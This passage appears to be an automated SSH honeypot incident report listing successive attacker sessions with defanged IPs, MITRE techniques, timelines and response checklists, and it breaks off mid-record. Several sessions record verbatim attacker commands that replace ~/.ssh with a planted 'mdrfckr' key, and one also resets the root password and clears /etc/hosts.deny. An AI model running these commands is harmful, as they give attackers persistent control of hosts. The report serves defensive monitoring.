| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:51:45` | `cowrie.session.connect` |
| `2026-04-16 19:51:45` | `cowrie.client.version` |
| `2026-04-16 19:51:45` | `cowrie.client.kex` |
| `2026-04-16 19:51:46` | `cowrie.login.success` |
| `2026-04-16 19:51:46` | `cowrie.session.params` |
| `2026-04-16 19:51:46` | `cowrie.command.input` |
| `2026-04-16 19:51:46` | `cowrie.command.failed` |
| `2026-04-16 19:51:46` | `cowrie.log.closed` |
| `2026-04-16 19:51:46` | `cowrie.session.params` |
| `2026-04-16 19:51:46` | `cowrie.command.input` |
| `2026-04-16 19:51:46` | `cowrie.session.file_download` |
| `2026-04-16 19:51:46` | `cowrie.log.closed` |
| `2026-04-16 19:51:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.249.247[.]165` to AbuseIPDB if not already reported
- [ ] Block `45.249.247[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8165634568b3

| Field | Detail |
|---|---|
| **Source IP** | `45.249.247[.]165` |
| **First Seen** | 2026-04-16 19:51 |
| **Last Seen** | 2026-04-16 19:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:51:48` | `cowrie.session.connect` |
| `2026-04-16 19:51:48` | `cowrie.client.version` |
| `2026-04-16 19:51:48` | `cowrie.client.kex` |
| `2026-04-16 19:51:49` | `cowrie.login.success` |
| `2026-04-16 19:51:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.249.247[.]165` to AbuseIPDB if not already reported
- [ ] Block `45.249.247[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffa08a203637

| Field | Detail |
|---|---|
| **Source IP** | `172.174.17[.]234` |
| **First Seen** | 2026-04-16 19:53 |
| **Last Seen** | 2026-04-16 19:54 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:53:59` | `cowrie.session.connect` |
| `2026-04-16 19:54:00` | `cowrie.client.version` |
| `2026-04-16 19:54:00` | `cowrie.client.kex` |
| `2026-04-16 19:54:07` | `cowrie.login.success` |
| `2026-04-16 19:54:07` | `cowrie.session.params` |
| `2026-04-16 19:54:07` | `cowrie.command.input` |
| `2026-04-16 19:54:07` | `cowrie.command.failed` |
| `2026-04-16 19:54:08` | `cowrie.log.closed` |
| `2026-04-16 19:54:08` | `cowrie.session.params` |
| `2026-04-16 19:54:08` | `cowrie.command.input` |
| `2026-04-16 19:54:09` | `cowrie.session.file_download` |
| `2026-04-16 19:54:09` | `cowrie.log.closed` |
| `2026-04-16 19:54:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.17[.]234` to AbuseIPDB if not already reported
- [ ] Block `172.174.17[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6445f26a8097

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-04-16 19:54 |
| **Last Seen** | 2026-04-16 19:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:54:07` | `cowrie.session.connect` |
| `2026-04-16 19:54:07` | `cowrie.client.version` |
| `2026-04-16 19:54:08` | `cowrie.client.kex` |
| `2026-04-16 19:54:08` | `cowrie.login.success` |
| `2026-04-16 19:54:08` | `cowrie.session.params` |
| `2026-04-16 19:54:08` | `cowrie.command.input` |
| `2026-04-16 19:54:08` | `cowrie.command.failed` |
| `2026-04-16 19:54:08` | `cowrie.log.closed` |
| `2026-04-16 19:54:09` | `cowrie.session.params` |
| `2026-04-16 19:54:09` | `cowrie.command.input` |
| `2026-04-16 19:54:09` | `cowrie.session.file_download` |
| `2026-04-16 19:54:09` | `cowrie.log.closed` |
| `2026-04-16 19:54:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2de9322b4dfa

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-04-16 19:54 |
| **Last Seen** | 2026-04-16 19:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:54:10` | `cowrie.session.connect` |
| `2026-04-16 19:54:10` | `cowrie.client.version` |
| `2026-04-16 19:54:11` | `cowrie.client.kex` |
| `2026-04-16 19:54:11` | `cowrie.login.success` |
| `2026-04-16 19:54:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6783334aee9

| Field | Detail |
|---|---|
| **Source IP** | `172.174.17[.]234` |
| **First Seen** | 2026-04-16 19:54 |
| **Last Seen** | 2026-04-16 19:54 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:54:17` | `cowrie.session.connect` |
| `2026-04-16 19:54:17` | `cowrie.client.version` |
| `2026-04-16 19:54:17` | `cowrie.client.kex` |
| `2026-04-16 19:54:22` | `cowrie.login.success` |
| `2026-04-16 19:54:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.17[.]234` to AbuseIPDB if not already reported
- [ ] Block `172.174.17[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b36da5bf1a67

| Field | Detail |
|---|---|
| **Source IP** | `178.218.144[.]64` |
| **First Seen** | 2026-04-16 19:56 |
| **Last Seen** | 2026-04-16 19:56 |
| **Session Duration** | 23s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:56:24` | `cowrie.session.connect` |
| `2026-04-16 19:56:25` | `cowrie.client.version` |
| `2026-04-16 19:56:25` | `cowrie.client.kex` |
| `2026-04-16 19:56:27` | `cowrie.client.fingerprint` |
| `2026-04-16 19:56:27` | `cowrie.login.failed` |
| `2026-04-16 19:56:27` | `cowrie.login.success` |
| `2026-04-16 19:56:46` | `cowrie.direct-tcpip.request` |
| `2026-04-16 19:56:47` | `cowrie.direct-tcpip.ja4` |
| `2026-04-16 19:56:47` | `cowrie.direct-tcpip.data` |
| `2026-04-16 19:56:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.218.144[.]64` to AbuseIPDB if not already reported
- [ ] Block `178.218.144[.]64` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e5323327e6a

| Field | Detail |
|---|---|
| **Source IP** | `45.249.247[.]165` |
| **First Seen** | 2026-04-16 19:56 |
| **Last Seen** | 2026-04-16 19:56 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:56:39` | `cowrie.session.connect` |
| `2026-04-16 19:56:39` | `cowrie.client.version` |
| `2026-04-16 19:56:39` | `cowrie.client.kex` |
| `2026-04-16 19:56:39` | `cowrie.login.success` |
| `2026-04-16 19:56:39` | `cowrie.session.params` |
| `2026-04-16 19:56:39` | `cowrie.command.input` |
| `2026-04-16 19:56:39` | `cowrie.command.failed` |
| `2026-04-16 19:56:39` | `cowrie.log.closed` |
| `2026-04-16 19:56:40` | `cowrie.session.params` |
| `2026-04-16 19:56:40` | `cowrie.command.input` |
| `2026-04-16 19:56:40` | `cowrie.session.file_download` |
| `2026-04-16 19:56:40` | `cowrie.log.closed` |
| `2026-04-16 19:56:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.249.247[.]165` to AbuseIPDB if not already reported
- [ ] Block `45.249.247[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-454cb6bdbc22

| Field | Detail |
|---|---|
| **Source IP** | `45.249.247[.]165` |
| **First Seen** | 2026-04-16 19:56 |
| **Last Seen** | 2026-04-16 19:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:56:42` | `cowrie.session.connect` |
| `2026-04-16 19:56:42` | `cowrie.client.version` |
| `2026-04-16 19:56:42` | `cowrie.client.kex` |
| `2026-04-16 19:56:42` | `cowrie.login.success` |
| `2026-04-16 19:56:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.249.247[.]165` to AbuseIPDB if not already reported
- [ ] Block `45.249.247[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68675d8fb30d

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-04-16 19:57 |
| **Last Seen** | 2026-04-16 19:57 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:57:30` | `cowrie.session.connect` |
| `2026-04-16 19:57:30` | `cowrie.client.version` |
| `2026-04-16 19:57:30` | `cowrie.client.kex` |
| `2026-04-16 19:57:30` | `cowrie.login.success` |
| `2026-04-16 19:57:31` | `cowrie.session.params` |
| `2026-04-16 19:57:31` | `cowrie.command.input` |
| `2026-04-16 19:57:31` | `cowrie.command.failed` |
| `2026-04-16 19:57:31` | `cowrie.log.closed` |
| `2026-04-16 19:57:31` | `cowrie.session.params` |
| `2026-04-16 19:57:31` | `cowrie.command.input` |
| `2026-04-16 19:57:31` | `cowrie.session.file_download` |
| `2026-04-16 19:57:31` | `cowrie.log.closed` |
| `2026-04-16 19:57:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ba8be32899e

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-04-16 19:57 |
| **Last Seen** | 2026-04-16 19:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:57:33` | `cowrie.session.connect` |
| `2026-04-16 19:57:33` | `cowrie.client.version` |
| `2026-04-16 19:57:33` | `cowrie.client.kex` |
| `2026-04-16 19:57:33` | `cowrie.login.success` |
| `2026-04-16 19:57:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3a4e9578067

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-04-16 19:59 |
| **Last Seen** | 2026-04-16 19:59 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:59:12` | `cowrie.session.connect` |
| `2026-04-16 19:59:12` | `cowrie.client.version` |
| `2026-04-16 19:59:12` | `cowrie.client.kex` |
| `2026-04-16 19:59:12` | `cowrie.login.success` |
| `2026-04-16 19:59:13` | `cowrie.session.params` |
| `2026-04-16 19:59:13` | `cowrie.command.input` |
| `2026-04-16 19:59:13` | `cowrie.command.failed` |
| `2026-04-16 19:59:13` | `cowrie.log.closed` |
| `2026-04-16 19:59:13` | `cowrie.session.params` |
| `2026-04-16 19:59:13` | `cowrie.command.input` |
| `2026-04-16 19:59:13` | `cowrie.session.file_download` |
| `2026-04-16 19:59:13` | `cowrie.log.closed` |
| `2026-04-16 19:59:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9be51153db2

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-04-16 19:59 |
| **Last Seen** | 2026-04-16 19:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:59:15` | `cowrie.session.connect` |
| `2026-04-16 19:59:15` | `cowrie.client.version` |
| `2026-04-16 19:59:15` | `cowrie.client.kex` |
| `2026-04-16 19:59:15` | `cowrie.login.success` |
| `2026-04-16 19:59:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2121bc99f981

| Field | Detail |
|---|---|
| **Source IP** | `45.249.247[.]165` |
| **First Seen** | 2026-04-16 19:59 |
| **Last Seen** | 2026-04-16 19:59 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:59:44` | `cowrie.session.connect` |
| `2026-04-16 19:59:44` | `cowrie.client.version` |
| `2026-04-16 19:59:44` | `cowrie.client.kex` |
| `2026-04-16 19:59:45` | `cowrie.login.success` |
| `2026-04-16 19:59:45` | `cowrie.session.params` |
| `2026-04-16 19:59:45` | `cowrie.command.input` |
| `2026-04-16 19:59:45` | `cowrie.command.failed` |
| `2026-04-16 19:59:45` | `cowrie.log.closed` |
| `2026-04-16 19:59:45` | `cowrie.session.params` |
| `2026-04-16 19:59:45` | `cowrie.command.input` |
| `2026-04-16 19:59:45` | `cowrie.session.file_download` |
| `2026-04-16 19:59:45` | `cowrie.log.closed` |
| `2026-04-16 19:59:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.249.247[.]165` to AbuseIPDB if not already reported
- [ ] Block `45.249.247[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d659595fb0a4

| Field | Detail |
|---|---|
| **Source IP** | `45.249.247[.]165` |
| **First Seen** | 2026-04-16 19:59 |
| **Last Seen** | 2026-04-16 19:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:59:47` | `cowrie.session.connect` |
| `2026-04-16 19:59:47` | `cowrie.client.version` |
| `2026-04-16 19:59:47` | `cowrie.client.kex` |
| `2026-04-16 19:59:48` | `cowrie.login.success` |
| `2026-04-16 19:59:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.249.247[.]165` to AbuseIPDB if not already reported
- [ ] Block `45.249.247[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-709843c2701f

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-04-16 20:00 |
| **Last Seen** | 2026-04-16 20:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 20:00:54` | `cowrie.session.connect` |
| `2026-04-16 20:00:54` | `cowrie.client.version` |
| `2026-04-16 20:00:54` | `cowrie.client.kex` |
| `2026-04-16 20:00:54` | `cowrie.login.success` |
| `2026-04-16 20:00:54` | `cowrie.session.params` |
| `2026-04-16 20:00:54` | `cowrie.command.input` |
| `2026-04-16 20:00:54` | `cowrie.command.failed` |
| `2026-04-16 20:00:55` | `cowrie.log.closed` |
| `2026-04-16 20:00:55` | `cowrie.session.params` |
| `2026-04-16 20:00:55` | `cowrie.command.input` |
| `2026-04-16 20:00:55` | `cowrie.session.file_download` |
| `2026-04-16 20:00:55` | `cowrie.log.closed` |
| `2026-04-16 20:00:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ad9dac1c044

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-04-16 20:00 |
| **Last Seen** | 2026-04-16 20:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 20:00:57` | `cowrie.session.connect` |
| `2026-04-16 20:00:57` | `cowrie.client.version` |
| `2026-04-16 20:00:57` | `cowrie.client.kex` |
| `2026-04-16 20:00:57` | `cowrie.login.success` |
| `2026-04-16 20:00:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-368ba9c7de43

| Field | Detail |
|---|---|
| **Source IP** | `172.174.17[.]234` |
| **First Seen** | 2026-04-16 20:02 |
| **Last Seen** | 2026-04-16 20:02 |
| **Session Duration** | 40s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:kTOx2sNWtPdK"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
